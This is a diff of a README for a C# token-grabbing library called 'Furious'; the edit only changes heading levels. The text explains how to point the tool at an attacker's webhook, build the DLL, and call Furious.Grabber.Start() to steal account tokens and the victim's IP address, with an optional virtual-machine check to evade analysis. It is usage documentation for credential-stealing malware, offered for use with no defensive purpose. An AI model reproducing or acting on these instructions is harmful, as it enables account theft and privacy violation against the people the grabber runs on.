@@ -6,11 +6,11 @@ Replace all occurances of "webhook-here" to your own server's webhook URL, this 
 
 Build the DLL and reference it in your project(s): ```using Furious;```
 
-### To grab tokens call
+#### To grab tokens call
 ```Furious.Grabber.Start();```
-### To grab tokens + IP address
+#### To grab tokens + IP address
 ```Furious.Grabber.Start(true);```
-### To check for a VM before attempting to grab anything
+#### To check for a VM before attempting to grab anything
 ```Furious.Grabber.Start(grabIP: true, checkForVM: true);```
 
 
